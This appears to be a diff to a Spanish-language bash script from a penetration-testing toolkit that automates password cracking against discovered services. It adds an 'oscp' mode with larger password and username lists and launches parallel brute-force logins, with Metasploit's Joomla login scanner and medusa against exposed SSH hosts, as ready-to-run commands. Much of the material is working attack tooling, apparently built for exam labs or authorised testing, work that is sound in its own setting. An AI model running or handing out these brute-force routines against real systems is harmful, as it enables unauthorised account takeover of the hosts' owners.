@@ -29,13 +29,14 @@ echo -e "$OKGREEN#################################### EMPEZANDO A CRACKEAR #####
 
 
 
-while getopts ":k:d:l:m:h:" OPTIONS
+while getopts ":k:d:l:m:h:e:" OPTIONS
 do
             case $OPTIONS in
             k)     ENTIDAD=$OPTARG;;            
             d)     DICTIONARY=$OPTARG;; 
 			l)     LANGUAGE=$OPTARG;;   
-			m)     MODE=$OPTARG;;        
+			m)     MODE=$OPTARG;;      
+			e)     EXTRATEST=$OPTARG;;  
             ?)     printf "Opcion invalida: -$OPTARG\n" $0
                           exit 2;;
            esac
@@ -45,10 +46,12 @@ ENTIDAD=${ENTIDAD:=NULL}
 DICTIONARY=${DICTIONARY:=NULL}
 MODE=${MODE:=NULL} # vulnerabilidades/hacking
 LANGUAGE=${LANGUAGE:=NULL} # en/es
+EXTRATEST=${EXTRATEST:=NULL} # oscp
+
 tomcat_passwrods_combo="/usr/share/lanscanner/tomcat-passwds.txt"
 FILE_SUBDOMAINS="importarMaltego/subdominios-scan.csv"
 
-echo "LANGUAGE $LANGUAGE MODE $MODE ENTIDAD(k) $ENTIDAD DICTIONARY $DICTIONARY"
+echo "LANGUAGE $LANGUAGE MODE $MODE ENTIDAD(k) $ENTIDAD DICTIONARY $DICTIONARY EXTRATEST $EXTRATEST"
 if [[ ${LANGUAGE} = NULL  ]];then 
 
 cat << "EOF"
@@ -75,6 +78,8 @@ fi
 
 #rm enumeracion/* 2>/dev/null
 #rm .vulnerabilidades/* 2>/dev/null
+USERNAMES_FILE="/usr/share/lanscanner/usuarios-$LANGUAGE.txt"
+PASSWORDS_FILE="/usr/share/lanscanner/passwords-top500-$LANGUAGE.txt"
 
 if [ "$LANGUAGE" == "es" ]; then
 	admin_user='administrador'
@@ -82,22 +87,26 @@ else
 	admin_user='administrator'
 fi
 
+if [ $EXTRATEST == "oscp" ]; then
+PASSWORDS_FILE="/usr/share/lanscanner/passwords-top5000-$LANGUAGE.txt"
+fi
+
+
 if [ $DICTIONARY = NULL ] ; then
 
 	if [ $ENTIDAD != NULL ] ; then
 		echo $ENTIDAD > base.txt
-		passGen.sh -f base.txt -t top500 -l $LANGUAGE -o passwords.txt
+		passGen.sh -f base.txt -t online -o online.txt
+		cat online.txt $PASSWORDS_FILE | sort | uniq >  passwords.txt
 		rm base.txt			
 	else
-	   cp /usr/share/lanscanner/top500-$LANGUAGE.txt passwords.txt
+	   cp $PASSWORDS_FILE passwords.txt
 	fi
 	echo "wordpress" >> passwords.txt	
 	echo "joomla" >> passwords.txt	
 	echo "drupal" >> passwords.txt
 else
-	cp $DICTIONARY passwords.txt	
-	
-	#/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
+	cp $DICTIONARY passwords.txt		
 fi
 
 function insert_data () {
@@ -218,8 +227,8 @@ then
 		if [[ $fingerprint = *"joomla"* ]]; then
 			echo -e "\t[+] Joomla identificado"
 			echo -e "\t[+] Probando contraseñas comunes ...."
-			cewl -w cewl-passwords.txt -e -a $proto_ip_port
-			cat passwords.txtcewl-passwords.txt | sort | uniq > passwords.txt
+			#cewl -w cewl-passwords.txt -e -a $proto_ip_port
+			#cat passwords.txt cewl-passwords.txt | sort | uniq > passwords.txt
 			echo "admin" > username.txt
 			echo "msfconsole -x \"use auxiliary/scanner/http/joomla_bruteforce_login;set USER_FILE username.txt;set USERPASS_FILE '';set RHOSTS $host;set AUTH_URI /$pathindex.php;set PASS_FILE passwords.txt;set RPORT $port; set USERNAME admin; set STOP_ON_SUCCESS true;run;exit\"" > logs/cracking/"$host"_"$port"_joomla.txt
 			msfconsole -x "use auxiliary/scanner/http/joomla_bruteforce_login;set USER_FILE username.txt;set USERPASS_FILE '';set RHOSTS $host;set AUTH_URI /$pathindex.php;set PASS_FILE passwords.txt;set RPORT $port; set USERNAME admin; set STOP_ON_SUCCESS true;run;exit" >> logs/cracking/"$host"_"$port"_joomla.txt 2>/dev/null
@@ -290,10 +299,14 @@ fi
 if [ -f servicios/ssh_onlyhost.txt ]
 then
 	echo -e "\n\t $OKBLUE Encontre servicios de SSH expuestos en  $RESET"	  
-	#interlace -tL servicios/ssh_onlyhost.txt -threads 10 -c "echo 'medusa -e n -u root -P passwords.txt -h _target_ -M ssh' >> logs/cracking/_target__22_passwordAdivinadoServ.txt" --silent
-	interlace -tL servicios/ssh_onlyhost.txt -threads 10 -c "medusa -e n -u root -P passwords.txt -h _target_ -M ssh >> logs/cracking/_target__22_passwordAdivinadoServ.txt" --silent &
-	insert_data
-		
+	if [ $EXTRATEST == "oscp" ]; then		
+		for username in $(cat $USERNAMES_FILE); do
+			interlace -tL servicios/ssh_onlyhost.txt -threads 10 -c "medusa -u $username -P passwords.txt -h _target_ -M ssh >> logs/cracking/_target__22_passwordAdivinadoServ.txt" --silent &
+		done
+	else
+		#interlace -tL servicios/ssh_onlyhost.txt -threads 10 -c "echo 'medusa -e n -u root -P passwords.txt -h _target_ -M ssh' >> logs/cracking/_target__22_passwordAdivinadoServ.txt" --silent
+		interlace -tL servicios/ssh_onlyhost.txt -threads 10 -c "medusa -e n -u root -P passwords.txt -h _target_ -M ssh >> logs/cracking/_target__22_passwordAdivinadoServ.txt" --silent &		
+	fi		
 fi
 
 			
@@ -301,8 +314,7 @@ fi
 
 
 
-			
-
+	
 ### telnet #########
 if [ -f servicios/telnet_onlyhost.txt ]
 then
@@ -314,7 +326,7 @@ fi
 
 
 if [ -f servicios/rdp.txt ]; then	
-	for line in $(cat servicios/rdp.txt); do			
+	for line in $(cat servicios/rdp.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 		echo -e "\n\t $OKBLUE Encontre servicios de RDP expuestos en $ip:$port $RESET"	  
